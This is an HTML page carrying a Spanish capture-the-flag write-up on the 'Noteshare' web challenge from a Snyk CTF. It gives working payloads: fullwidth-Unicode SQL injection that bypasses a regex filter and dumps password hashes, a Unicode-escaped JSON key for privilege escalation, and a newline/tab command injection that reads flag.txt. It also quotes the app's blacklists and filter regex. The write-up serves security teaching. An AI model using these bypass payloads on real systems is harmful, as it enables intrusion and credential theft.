@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+  <title>Noteshare (WEB) - Snyk CTF | IS0L3D</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet"  href="/css/writeups.css" 
+  >
+
+</head>
+<body>
+  <div id="vanta-globe"></div>
+  <nav class="navbar" aria-label="Navegacion principal">
+  <ul>
+    <li class="left-item"><a href="/">IS0L3D</a></li>
+    <li class="right-item">
+        <a href="/">Bio</a>
+      </li>
+    <li class="right-item">
+        <a href="/notas/">Notas</a>
+      </li>
+    <li class="right-item active">
+        <a href="/writeups/">Writeups</a>
+      </li>
+    
+  </ul>
+</nav>
+
+  <main class="site-main">
+    
+<div class="wp-drawer-toolbar wp-drawer-toolbar-single">
+  <button
+    class="wp-drawer-toggle wp-toc-toggle"
+    type="button"
+    aria-expanded="false"
+    aria-controls="wp-right-panel"
+    data-target="#wp-right-panel">
+    Contenido
+  </button>
+</div>
+<div class="wp-drawer-overlay" hidden></div>
+
+<div class="wp-grid wp-grid-single">
+  <aside class="wp-left">
+    <nav class="wp-nav" aria-label="Writeups por categoria">
+  <h3>Categorias</h3>
+  
+    
+    
+      
+      
+        
+      
+      
+        
+        <details>
+          <summary>
+            <a href="/categories/ctfs/">ctfs</a>
+            <small>(1)</small>
+          </summary>
+          <ul>
+            
+              <li class="active">
+                <a href="/writeups/ctfs/noteshare/">Noteshare (WEB) - Snyk CTF</a>
+              </li>
+            
+          </ul>
+        </details>
+      
+    
+      
+      
+        
+      
+      
+    
+      
+      
+        
+      
+      
+    
+      
+      
+        
+      
+      
+    
+      
+      
+        
+      
+      
+        
+        <details>
+          <summary>
+            <a href="/categories/web/">web</a>
+            <small>(1)</small>
+          </summary>
+          <ul>
+            
+              <li class="active">
+                <a href="/writeups/ctfs/noteshare/">Noteshare (WEB) - Snyk CTF</a>
+              </li>
+            
+          </ul>
+        </details>
+      
+    
+    
+  
+</nav>
+
+  </aside>
+
+  <article class="wp-center">
+    <header class="wp-header">
+      <h1>Noteshare (WEB) - Snyk CTF</h1>
+      
+      <p class="wp-meta">
+        <time datetime="2026-02-13 00:00:00 &#43;0000 UTC">2026-02-13</time>
+         &middot; Snyk CTF
+         &middot; Medium
+      </p>
+    </header>
+    <div class="wp-content">
+      <p><img src="image.png" alt="image.png"></p>
+<p><img src="image%201.png" alt="image.png"></p>
+<p>El reto se basó en una cadena de vulnerabilidades que permitió escalar desde un usuario sin privilegios hasta la ejecución remota de comandos en el servidor. Se facilitó el código fuente de la aplicación, compuesto principalmente por dos archivos:</p>
+<p><img src="image%202.png" alt="image.png"></p>
+<p>Al revisar el archivo <code>app.py</code>, se identificaron funciones relevantes:</p>
+<ul>
+<li>Uso de SQLite como base de datos.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">get_db</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getattr</span>(<span style="color:#a6e22e">g</span>, <span style="color:#e6db74">&#39;_database&#39;</span>, <span style="color:#a6e22e">None</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">db</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">None</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">g</span>.<span style="color:#a6e22e">_database</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sqlite3</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">DATABASE</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">row_factory</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sqlite3</span>.<span style="color:#a6e22e">Row</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">db</span>
+</span></span></code></pre></div><ul>
+<li>Contraseñas almacenadas con MD5.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">route</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, <span style="color:#a6e22e">methods</span><span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">login</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">execute</span>(<span style="color:#e6db74">&#39;SELECT * FROM users WHERE username = ? AND password = ?&#39;</span>,
+</span></span><span style="display:flex;"><span>                     (<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">hashlib</span>.<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">password</span>.<span style="color:#a6e22e">encode</span>()).<span style="color:#a6e22e">hexdigest</span>())).<span style="color:#a6e22e">fetchone</span>()
+</span></span><span style="display:flex;"><span>    ...
+</span></span></code></pre></div><ul>
+<li>Un filtro propio <code>filter_security_input</code> aplicado a las etiquetas (<code>tags</code>) al crearse una nueva nota en la ruta <code>@app.route('/notes/create', methods=['POST'])</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">filter_security_input</span>(<span style="color:#a6e22e">tags</span>)<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">tags</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">tags</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">regex</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">re</span>.<span style="color:#a6e22e">compile</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">r</span><span style="color:#e6db74">&#34;^(?!.*[&#39;\&#34;;\-#=&lt;&gt;|&amp;])&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">r</span><span style="color:#e6db74">&#34;(?!.*(/\*|\*/))&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">r</span><span style="color:#e6db74">&#34;(?!.*(union|select|insert|update|delete|drop|create|alter|exec|execute|where|from|join|order|group|having|limit|offset|into|values|set|table|database|column|index|view|trigger|procedure|function|declare|cast|convert|char|concat|substring|ascii|hex|unhex|sleep|benchmark|waitfor|delay|information_schema|sysobjects|syscolumns))&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">r</span><span style="color:#e6db74">&#34;.+$&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">re</span>.<span style="color:#a6e22e">IGNORECASE</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">regex</span>.<span style="color:#a6e22e">match</span>(<span style="color:#a6e22e">tags</span>)<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">None</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">normalized</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">unicodedata</span>.<span style="color:#a6e22e">normalize</span>(<span style="color:#e6db74">&#39;NFKC&#39;</span>, <span style="color:#a6e22e">tags</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">normalized</span>
+</span></span></code></pre></div><ul>
+<li>Rutas privilegiadas: <code>/settings/import</code> y <code>/admin/export</code>.</li>
+</ul>
+<h2 id="aplicación-web">Aplicación Web</h2>
+<p>Fue posible crear una cuenta nueva e iniciar sesión:</p>
+<p><img src="f4a7978c-3170-45c6-b5ff-09566ac33ce5.png" alt="image.png"></p>
+<p>En el endpoint <code>notes</code>, se observa nuestro rol actual <code>USER</code> y un formulario en donde es posible crear una nota nueva agregando su respectivo tag (categoría):</p>
+<p><img src="image%203.png" alt="image.png"></p>
+<h2 id="inyección-sql">Inyección SQL</h2>
+<p>Al revisar la ruta <code>@app.route('/shared/&lt;note_id&gt;')</code>, se observó que la aplicación construyó la consulta <code>stats_query</code> mediante interpolación de cadenas (<code>f-string</code>) incorporando directamente el valor de <code>tags</code> en el <code>LIKE</code>. Al no utilizar parámetros preparados, el campo <code>tags</code> se convirtió en un punto de entrada para inyección SQL.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">tags</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">stats_query</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span><span style="color:#e6db74">&#34;SELECT action, COUNT(*) as count FROM logs WHERE metadata LIKE &#39;%{tags}%&#39; GROUP BY action&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">results</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">execute</span>(<span style="color:#a6e22e">stats_query</span>).<span style="color:#a6e22e">fetchall</span>()
+</span></span><span style="display:flex;"><span>            ...
+</span></span></code></pre></div><p>El filtro <code>filter_security_input</code> validó el texto original con un regex orientado a ASCII y únicamente después aplicó <code>unicodedata.normalize('NFKC', tags)</code>. Por ello, fue posible enviar palabras clave SQL en caracteres fullwidth, que el regex no detectó, y que tras la normalización se convirtieron a ASCII ejecutable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">regex</span>.<span style="color:#a6e22e">match</span>(<span style="color:#a6e22e">tags</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">None</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">normalized</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">unicodedata</span>.<span style="color:#a6e22e">normalize</span>(<span style="color:#e6db74">&#39;NFKC&#39;</span>, <span style="color:#a6e22e">tags</span>)
+</span></span></code></pre></div><p>Para validar esta hipótesis se realizó una prueba de concepto utilizando el siguiente valor en el campo de <code>tag</code>dentro del formulario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ｘ＇　ＵＮＩＯＮ　ＳＥＬＥＣＴ　１－－　－ 
+</span></span></code></pre></div><p>Al visualizar la nota la respuesta fue:</p>
+<p><img src="image%204.png" alt="image.png"></p>
+<p>Confirmada la inyección SQL por medio de esta técnica, se ajustó la carga útil para exfiltrar las credenciales almacenadas en la base de datos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ｘ＇　ＵＮＩＯＮ　ＳＥＬＥＣＴ　（ＳＥＬＥＣＴ　ｇｒｏｕｐ＿ｃｏｎｃａｔ（ｕｓｅｒｎａｍｅ｜｜＇：＇｜｜ｐａｓｓｗｏｒｄ）　ＦＲＯＭ　ｕｓｅｒｓ），　２－－　－
+</span></span></code></pre></div><p>Tras la normalización, la consulta devolvió los pares <code>usuario:hash</code> de la base de datos:</p>
+<p><img src="image%205.png" alt="image.png"></p>
+<p>El hash MD5 para el usuario administrador no pudo ser crackeado, sin embargo para el usuario <code>editor</code> se encontró la siguiente contraseña:</p>
+<p><img src="image%206.png" alt="image.png"></p>
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+<p>Una vez iniciada la sesión con la cuenta <code>editor</code>, se habilitó una nueva función de configuración en el sistema, en donde se permitía subir un JSON de configuración.</p>
+<p><img src="image%207.png" alt="image.png"></p>
+<p>En <code>settings_import</code>, la aplicación implementó un control basado en lista negra que buscaba cadenas como <code>role</code> en el contenido crudo del archivo antes de deserializarlo con <code>json.loads</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">file</span>.<span style="color:#a6e22e">read</span>().<span style="color:#a6e22e">decode</span>(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">dangerous_patterns</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;__class__&#39;</span>, <span style="color:#e6db74">&#39;__globals__&#39;</span>, <span style="color:#e6db74">&#39;__builtins__&#39;</span>, <span style="color:#e6db74">&#39;__init__&#39;</span>, 
+</span></span><span style="display:flex;"><span>                      <span style="color:#e6db74">&#39;__dict__&#39;</span>, <span style="color:#e6db74">&#39;role&#39;</span>, <span style="color:#e6db74">&#39;user_id&#39;</span>, <span style="color:#e6db74">&#39;username&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">pattern</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">dangerous_patterns</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">pattern</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">lower</span>()<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;Potentially dangerous configuration detected: {pattern}&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">config_data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">loads</span>(<span style="color:#a6e22e">content</span>)
+</span></span></code></pre></div><p>Esto permitió crear y cargar un archivo <code>config.json</code> con el siguiente contenido con el objetivo de evadir la detección representando la clave <code>role</code> mediante escapes Unicode en el JSON:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;\u0072\u006f\u006c\u0065&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Tras <code>json.loads</code>, la clave se decodificó a <code>role</code> y fue asignada directamente a la sesión a través de <code>session[key] = value</code>, provocando la elevación de privilegios.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">value</span>, (<span style="color:#a6e22e">str</span>, <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">float</span>, <span style="color:#a6e22e">bool</span>, <span style="color:#a6e22e">list</span>, <span style="color:#a6e22e">type</span>(<span style="color:#a6e22e">None</span>)))<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">session</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">value</span>
+</span></span></code></pre></div><p><img src="image%208.png" alt="image.png"></p>
+<p>En esta nueva sección podemos exportar los logs de las acciones de los distintos usuarios pudiendo indicar el nombre y el formato de salida del archivo:</p>
+<p><img src="image%209.png" alt="image.png"></p>
+<p>En <code>/admin/export</code>, el valor <code>filename</code> se incorporó en la variable <code>filepath</code> y posteriormente se ejecutó en un comando de shell mediante <code>os.system</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">filepath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span><span style="color:#e6db74">&#34;{export_dir}/{safe_filename}&#34;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">system</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#34;cat {temp.name} &gt; {filepath} &amp;&amp; chmod 644 {filepath}&#34;</span>)
+</span></span></code></pre></div><p>Aunque existía una lista negra de caracteres, ésta no contempló separadores de comando alternativos como el salto de línea (<code>\n</code>) y/o tabuladores (<code>\t</code>).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">blacklist</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;|&#39;</span>, <span style="color:#e6db74">&#39;&amp;&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;$&#39;</span>, <span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;,&#39;</span>, <span style="color:#e6db74">&#39;{&#39;</span>, <span style="color:#e6db74">&#39;}&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">blacklist</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">filename</span> <span style="color:#a6e22e">or</span> <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">format_type</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> ...
+</span></span></code></pre></div><h2 id="flag">Flag</h2>
+<p>Para evitar depender de una reverse shell, se utilizó la propia base de datos como canal de exfiltración. Para este caso en particular, se adaptó un script Python para leer el archivo <code>flag.txt</code> y guardar su contenido en la tabla <code>logs</code> de la base de datos.</p>
+<p>Con ayuda de BurpSuite se modificó el cuerpo POST de la petición para ejecutar lo siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">filename</span><span style="color:#f92672">=</span><span style="color:#a6e22e">test</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">Apython3</span><span style="color:#f92672">%</span><span style="color:#ae81ff">09</span><span style="color:#f92672">-</span><span style="color:#a6e22e">c</span><span style="color:#f92672">%</span><span style="color:#ae81ff">09</span><span style="color:#f92672">%</span><span style="color:#ae81ff">27</span><span style="color:#66d9ef">import</span><span style="color:#f92672">%</span><span style="color:#ae81ff">09</span><span style="color:#a6e22e">sqlite3</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">Ad</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Dopen</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">Fflag</span>.<span style="color:#a6e22e">txt</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">Ac</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Dsqlite3</span>.<span style="color:#a6e22e">connect</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">Ax</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Dc</span>.<span style="color:#a6e22e">cursor</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">Ax</span>.<span style="color:#a6e22e">execute</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">INSERT</span><span style="color:#f92672">%</span><span style="color:#ae81ff">09</span><span style="color:#a6e22e">INTO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">09</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#a6e22e">metadata</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#a6e22e">VALUES</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">C</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">Bd</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">C</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">Ac</span>.<span style="color:#a6e22e">commit</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">27</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">format</span><span style="color:#f92672">=</span><span style="color:#a6e22e">log</span>
+</span></span></code></pre></div><p>Finalmente, se reutilizó el mismo vector de SQLi inicial y se contruyo una consulta para extraer el contenido de la tabla logs utilizando la técnica de evasión fullwidth de la forma:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ｘ＇　ＵＮＩＯＮ　ＳＥＬＥＣＴ　（ＳＥＬＥＣＴ　ｇｒｏｕｐ＿ｃｏｎｃａｔ（ｍｅｔａｄａｔａ）　ＦＲＯＭ　ｌｏｇｓ），　２－－　－
+</span></span></code></pre></div><p>La respuesta del servidor mostró, dentro de la concatenación de <code>metadata</code> de <code>logs</code>, el contenido de <code>flag.txt</code>:</p>
+<p><img src="image%2010.png" alt="image.png"></p>
+
+    </div>
+  </article>
+
+  <aside class="wp-right" id="wp-right-panel">
+    
+<div class="toc-box">
+  <h3>Contenido</h3>
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#aplicación-web">Aplicación Web</a></li>
+    <li><a href="#inyección-sql">Inyección SQL</a></li>
+    <li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li>
+    <li><a href="#flag">Flag</a></li>
+  </ul>
+</nav>
+</div>
+
+
+  </aside>
+</div>
+
+  </main>
+
+  <script src="/js/three.min.js"></script>
+  <script src="/js/vanta.globe.min.js"></script>
+  <script src="/js/vanta.effect.js"></script>
+  
+  <script src="/js/writeups.drawer.js"></script>
+  
+  <script src="/js/code-copy.js"></script>
+  <script src="/js/goat.counter.js"></script>
+  <footer>
+  <p>&copy; 2026 Made with ❤️ by IS0L3D. Todos los derechos reservados.</p>
+  <p>Contacto: <a href="https://www.linkedin.com/in/arruchaeduardo" target="_blank" rel="noopener noreferrer">https://www.linkedin.com/in/arruchaeduardo</a></p>
+</footer>
+
+</body>
+</html>
